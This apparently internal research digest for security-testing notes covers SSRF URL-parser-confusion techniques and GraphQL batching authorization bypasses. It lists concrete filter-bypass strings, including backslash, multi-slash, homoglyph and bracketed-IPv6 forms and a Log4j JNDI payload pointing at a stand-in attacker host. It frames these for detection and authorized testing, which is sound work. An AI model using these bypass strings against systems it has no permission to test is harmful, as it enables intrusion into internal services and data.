## 1. SSRF — URL-parser-confusion taxonomy: the mechanism behind "why filter bypasses work" (`class-ssrf.md`)

Our doc already says "assume bypassable, don't enumerate payloads" — this adds the **taxonomy + concrete strings** so the reasoning has teeth, plus a genuinely new 2026 CVE cluster in a Node.js library that's directly relevant to any JS-stack in-scope host.

- Claroty Team82's cross-language study of 16 URL parsers (Python urllib/urllib3/rfc3986, curl, Chrome, .NET Uri, Java URL/URI, PHP parse_url, Node url/url-parse, Go net/url, Ruby uri, Perl URI) formalizes **five confusion classes**: scheme confusion (missing/malformed scheme), slash confusion (irregular slash count), backslash confusion, URL-encoded-data confusion, scheme mixup (parsing scheme-A syntax with scheme-B's parser). — [claroty.com/team82](https://claroty.com/team82/research/exploiting-url-parsing-confusion)
- Concrete bypass strings (validator says "blocked host", fetcher goes elsewhere):
  - Backslash: `http:\\google.com` / `https:/\google.com` — Chrome and several fetchers treat `\` as `/`.
  - No-scheme: `google.com/abc` — some validators find no netloc and pass; curl/urllib3 default to `http://` and fetch it anyway.
  - Slash-confusion: `http:///google.com`, `http:/google.com`, `http://target.com/////evil.com` (real CVE in the Ruby `Clearance` gem — app stores the multi-slash path, then `URI.parse` re-trims it to `///evil.com`, which browsers resolve as a network-path reference to `evil.com`).
  - Fragment truncation (the original Log4j `allowedLdapHost` bypass, still the canonical example): `${jndi:ldap://127.0.0.1#.evilhost.com:1389/a}` — validator's URI class extracts authority up to `#` (sees `127.0.0.1`, passes), the actual connector resolves past it to `evilhost.com`.
  - `http://127.0.0.1\@allowed.com/` and `http://allowed.com⁄@127.0.0.1/` (U+2044 fraction-slash homoglyph) — userinfo-`@` + lookalike-char tricks against validators that split on the wrong character.
- ⚠️ **New CVE cluster, self-flag before citing:** multiple 2026 CVEs against Node's **fast-uri** library (used by `ajv`/many JSON-schema + URL-validation stacks) — IPv6-bracket-literal grammar isn't enforced, so a malformed bracketed literal (`[::1<garbage>]`) gets **silently truncated** into a valid loopback/private address, meaning a host-allowlist check can pass a string that later resolves to `127.0.0.1`/metadata IPs. CVE IDs seen (CVE-2026-75899, CVE-2026-75975, CVE-2026-76172, CVE-2026-75931, CVE-2026-16221) came from `cvereports.com`/`dailycve.com`/Snyk's advisory DB, not a vendor advisory directly — **NVD/GHSA-verify the exact ID before using it in a report**; the underlying mechanism (bracketed-IPv6 truncation → SSRF) is corroborated across sources and safe to act on for detection even before ID reconciliation. — [security.snyk.io/vuln/SNYK-JS-FASTURI-18021349](https://security.snyk.io/vuln/SNYK-JS-FASTURI-18021349), [snyk.io/blog/url-confusion-vulnerabilities](https://snyk.io/blog/url-confusion-vulnerabilities/)
- **Detection approach for our unauth-safe lane:** this is a *differential*, not a single payload — feed the SAME crafted host string (scheme-mixed / backslash / multi-slash / fragment-truncated / bracket-mangled-IPv6) into an SSRF sink pointed at our own interactsh canary domain-with-decoy-prefix (e.g. `http://<canary>#.evil.example` or `http:\\<canary>`). A callback proves the app's *fetcher* normalized past whatever validator it has — still gated on the existing OOB-callback confirm primitive, no new exploitation, just better payload selection to trigger the callback on hardened-looking sinks.



## 2. GraphQL — batching cache-warmup bypass (small addition to the already-deep `class-graphql.md`)

Distinct from the existing rate-limit/brute-force batching notes already in the doc: a **response-cache-mismanagement** variant where batching itself causes an authorization bypass, not just a throttle bypass.

- If a GraphQL server (or an edge cache in front of it) caches per-field results keyed loosely (e.g. by field name + args, not by requester identity), a single batched request that puts **your own authorized query first** in the array can "warm" a shared cache entry, and a subsequent aliased field in the *same batch* requesting another user's object may be served from that now-warm cache slot without re-checking auth. — pattern described generically across recent GraphQL-security roundups (RingSafe "GraphQL Security 2026 — Beyond Introspection", Beagle Security); no single disclosed CVE/report found this run, treat as a **testing hypothesis worth probing**, not a confirmed-in-the-wild technique yet.
- Also reiterated: some authorization middlewares check only the **first operation** in a batched array, letting later operations in the same request skip the auth gate entirely — same class as the existing "nested-field authorization gap" note but at the batch-array level rather than the field-resolution level.
